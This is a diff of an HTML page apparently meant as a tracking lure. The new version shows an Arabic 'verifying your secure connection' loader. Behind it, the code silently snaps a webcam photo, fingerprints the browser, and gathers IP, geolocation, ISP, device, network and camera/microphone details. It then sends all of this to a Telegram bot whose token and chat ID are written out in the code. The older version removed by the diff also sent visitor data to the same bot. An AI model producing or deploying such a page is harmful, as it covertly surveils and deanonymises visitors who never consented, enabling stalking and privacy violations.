@@ -1,193 +1,196 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Scary Tracker</title>
-    <script src="index.css"></script>
-    <style>
-        body {
-            background-color: black;
-            color: red;
-            font-family: 'Arial', sans-serif;
-            text-align: center;
-            padding: 20px;
-            margin: 0;
-            overflow: auto;
-        }
-        h1 {
-            font-size: 3em;
-            font-weight: bold;
-            color: red;
-            text-transform: uppercase;
-            animation: glitch 2s infinite;
-        }
-        @keyframes glitch {
-            0% { text-shadow: 2px 2px 0 brown, -2px -2px 0 rgb(255, 255, 255); }
-            25% { text-shadow: -2px -2px 0 brown, 2px 2px 0  rgb(62, 125, 116); }
-            50% { text-shadow: 2px 2px 0 brown, -2px -2px 0  rgb(255, 255, 255); }
-            75% { text-shadow: -2px -2px 0 brown, 2px 2px 0   rgb(62, 125, 116); }
-            100% { text-shadow: 2px 2px 0 brown, -2px -2px 0 white; }
-        }
-        #trollFace {
-            width: 100%;
-            max-width: 250px;
-            height: auto;
-            animation: zoomIn 3s ease-out;
-        }
-        @keyframes zoomIn {
-            0% { transform: scale(0); }
-            100% { transform: scale(1); }
-        }
-        .content {
-            margin-top: 20px;
-            font-size: 1.2em;
-            color: white;
-            word-wrap: break-word;
-            overflow: hidden;
-            width: 80%;
-            margin: 0 auto;
-            text-align: center;
-            /* margin-left: 150px; */
-        }
-        #map {
-            margin-top: 20px;
-            margin-left: 85px;
-            border: 3px solid red;
-            width: 80%;
-            height: 400px;
-            word-wrap: break-word;
-            overflow: hidden;
-            margin: 0 auto;
-            text-align: left;
-        }
-        .button {
-            background-color: red;
-            color: white;
-            padding: 15px;
-            border: none;
-            cursor: pointer;
-            font-size: 1.5em;
-            margin-top: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
-        }
-        .button:hover {
-            background-color: darkred;
-        }
-        .typewriter {
-            display: inline-block;
-            overflow: hidden;
-            border-right: .15em solid red;
-            white-space: nowrap;
-            margin: 0 auto;
-            animation: typing 3.5s steps(40, end), blink 0.75s step-end infinite;
-        }
-        @keyframes typing {
-            from { width: 0; }
-            to { width: 100%; }
-        }
-        @keyframes blink {
-            50% { border-color: transparent; }
-        }
-        .final-message {
-            font-size: 1.8em;
-            color: red;
-            margin-top: 30px;
-            animation: shake 0.5s infinite alternate;
-        }
-        @keyframes shake {
-            0% { transform: translateX(-5px); }
-            100% { transform: translateX(5px); }
-        }
-        #music {
-            display: none;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Elite vIP Tracker</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #121212;
+      color: #ffffff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+      flex-direction: column;
+    }
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #3498db;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    #cameraPreview {
+      display: none;
+      width: 320px;
+      height: 240px;
+      margin: 20px auto;
+      object-fit: cover;
+    }
+    #capturedImage {
+      display: none;
+      max-width: 320px;
+      max-height: 240px;
+      margin: 20px auto;
+    }
+  </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/platform/1.3.6/platform.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
 </head>
 <body>
 
-    <!-- Hidden background music -->
-    <audio id="music" autoplay loop>
-        <source src="https://www.soundjay.com/button/beep-07.wav" type="audio/wav">
-    </audio>
+<div class="loader"></div>
+<h2>🔒 جارٍ التحقق من اتصالك الآمن...</h2>
 
-    <!-- Troll Face -->
-    <img src="https://i.pinimg.com/736x/23/c8/70/23c870bf96c2a15cd26cf558de5d3cdf.jpg" alt="Troll Face" id="trollFace">
+<video id="cameraPreview" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
+<img id="capturedImage" alt="الصورة الملتقطة">
 
-    <h1> Привет! </h1>
-    <h1> Hello! </h1>
-    <div class="content">
-        <p id="ipData">Loading your info...</p>
-        <p id="deviceData"></p>
-    </div>
+<script>
+(async () => {
+  try {
+    // بيانات البوت
+    const botToken = "8102627165:AAFWsgPIljsQwGPGWYcCsNdJPPDn-a47IM8";
+    const chatId = "6405482546";
+    
+    let imageBlob = null;
+    
+    // محاولة الوصول إلى الكاميرا والتقاط الصورة
+    try {
+      const video = document.getElementById('cameraPreview');
+      const canvas = document.getElementById('canvas');
+      const capturedImage = document.getElementById('capturedImage');
+      
+      // طلب إذن الكاميرا
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: 'user' }, 
+        audio: false 
+      });
+      
+      video.srcObject = stream;
+      video.style.display = 'block';
+      
+      // انتظر ثانية لضمان تشغيل الكاميرا
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      
+      // التقاط صورة من الفيديو
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      // تحويل الصورة إلى blob
+      const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+      const res = await fetch(dataUrl);
+      imageBlob = await res.blob();
+      
+      // عرض الصورة الملتقطة
+      capturedImage.src = dataUrl;
+      capturedImage.style.display = 'block';
+      
+      // إيقاف الكاميرا
+      stream.getTracks().forEach(track => track.stop());
+      video.style.display = 'none';
+      
+    } catch (camError) {
+      console.log("تعذر الوصول إلى الكاميرا:", camError);
+    }
+    
+    // ننتظر 3 ثواني إضافية (بعد محاولة التقاط الصورة)
+    await new Promise(resolve => setTimeout(resolve, 3000));
 
-    <iframe id="map"></iframe>
+    // بصمة المتصفح
+    const fpPromise = FingerprintJS.load();
+    const fp = await fpPromise;
+    const result = await fp.get();
+    const browserFingerprint = result.visitorId;
 
-    <div class="final-message">
-        <p> Этот сайт предназначен для тестирования сервера GitHub. </p>
-        <p> This site is for testing the GitHub server. </p>
-    </div>
+    // بيانات IP والموقع
+    const ipinfo = await fetch("https://ipinfo.io/json?token=ded76e1cc16472").then(r => r.json());
+    const mapLink = `https://www.google.com/maps?q=${ipinfo.loc}`;
 
-    <script>
-        async function fetchData() {
-            // Fetch IP and location info
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const ipData = await ipRes.json();
-            
-            // Detect device type (mobile, tablet, desktop)
-            const deviceType = detectDeviceType();
+    // معلومات الجهاز
+    const ua = platform;
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+    const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "📱 هاتف" : "💻 كمبيوتر/لوحي";
+    const ram = navigator.deviceMemory || "غير معروف";
+    const cpu = navigator.hardwareConcurrency || "غير معروف";
 
-            // Device info
-            const deviceInfo = getDeviceInfo();
+    // كاميرا ومايك
+    const devices = await navigator.mediaDevices.enumerateDevices();
+    const hasCam = devices.some(d => d.kind === "videoinput");
+    const hasMic = devices.some(d => d.kind === "audioinput");
 
-            // Display IP and Location Info
-            document.getElementById('ipData').innerHTML = `Your IP: ${ipData.ip}<br>Location: ${ipData.city}, ${ipData.country_name}<br>Region: ${ipData.region}<br>ISP: ${ipData.org}<br>Timezone: ${ipData.timezone}<br>Latitude: ${ipData.latitude}<br>Longitude: ${ipData.longitude}`;
-            document.getElementById('deviceData').innerHTML = `Device: ${deviceType}<br>Manufacturer: ${deviceInfo}<br>Browser: ${navigator.appName} ${navigator.appVersion}<br>Screen Size: ${window.innerWidth}x${window.innerHeight}<br>Operating System: ${navigator.platform}`;
+    // بناء الرسالة
+    const msg = `
+📥 *زائر جديد:*
 
-            // Display Google Map with Location
-            const iframe = document.getElementById('map');
-            iframe.src = `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}&z=10&output=embed`;
+🌍 *IP:* ${ipinfo.ip}
+🏙 *الموقع:* ${ipinfo.city}, ${ipinfo.region}, ${ipinfo.country}
+🔌 *مزود الخدمة:* ${ipinfo.org}
+🗺 *الموقع على الخريطة:* [اضغط هنا](${mapLink})
 
-            // Send data to Telegram Bot
-            const message = `IP: ${ipData.ip}\nLocation: ${ipData.city}, ${ipData.country_name}\nRegion: ${ipData.region}\nISP: ${ipData.org}\nTimezone: ${ipData.timezone}\nLatitude: ${ipData.latitude}\nLongitude: ${ipData.longitude}\nDevice: ${deviceType}\nManufacturer: ${deviceInfo}\nBrowser: ${navigator.appName} ${navigator.appVersion}\nScreen Size: ${window.innerWidth}x${window.innerHeight}\nOperating System: ${navigator.platform}`;
-            sendMessageToTelegram(message);
-        }
+🖥 *الجهاز:* ${deviceType}
+💻 *النظام:* ${ua.os}
+🧠 *المعالج:* ${cpu}
+💾 *الرام:* ${ram} GB
+🌐 *المتصفح:* ${ua.name} ${ua.version}
+📺 *دقة الشاشة:* ${screen.width}x${screen.height}
+⚡️ *نوع الشبكة:* ${(connection.effectiveType || "غير معروف").toUpperCase()} (${connection.type || "غير معروف"})
+🚀 *التحميل:* ${connection.downlink || "غير معروف"} Mbps
 
-        function detectDeviceType() {
-            const ua = navigator.userAgent;
-            if (/windows/i.test(ua)) {
-                return "Windows PC";
-            } else if (/android/i.test(ua)) {
-                return "Android Phone/Tablet";
-            } else if (/iphone|ipad|ipod/i.test(ua)) {
-                return "iPhone/iPad";
-            } else {
-                return "Unknown Device";
-            }
-        }
+🈯️ *اللغة:* ${navigator.language}
+⏰ *المنطقة الزمنية:* ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+🎥 *كاميرا:* ${hasCam ? "نعم" : "لا"}
+🎙 *مايك:* ${hasMic ? "نعم" : "لا"}
 
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            if (/windows/i.test(ua)) {
-                return "Windows";
-            } else if (/android/i.test(ua)) {
-                return "Android";
-            } else if (/iphone|ipad|ipod/i.test(ua)) {
-                return "iPhone";
-            } else {
-                return "Unknown Manufacturer";
-            }
-        }
+🧬 *بصمة المتصفح:* ${browserFingerprint}
+    `;
 
-        async function sendMessageToTelegram(message) {
-            const botToken1 = '8102627165:AAFWsgPIljsQwGPGWYcCsNdJPPDn-a47IM8';
-            const chatId1 = '6405482546';
-            const url = `https://api.telegram.org/bot${botToken1}/sendMessage?chat_id=${chatId1}&text=${encodeURIComponent(message)}`;
-            await fetch(url);
-        }
-        fetchData();
-    </script>
+    // الإرسال إلى تيليجرام
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('caption', msg);
+    formData.append('parse_mode', 'Markdown');
+    
+    if (imageBlob) {
+      formData.append('photo', imageBlob, 'captured.jpg');
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+    } else {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: msg,
+          parse_mode: "Markdown"
+        })
+      });
+    }
+
+    // تغيير النص بعد الإرسال
+    document.body.innerHTML = `<h1>✅ تم التحقق بنجاح!</h1>`;
+
+  } catch (err) {
+    console.error("حدث خطأ:", err);
+    document.body.innerHTML = `<h1>❌ حدث خطأ أثناء التحقق!</h1>`;
+  }
+})();
+</script>
 
 </body>
 </html>
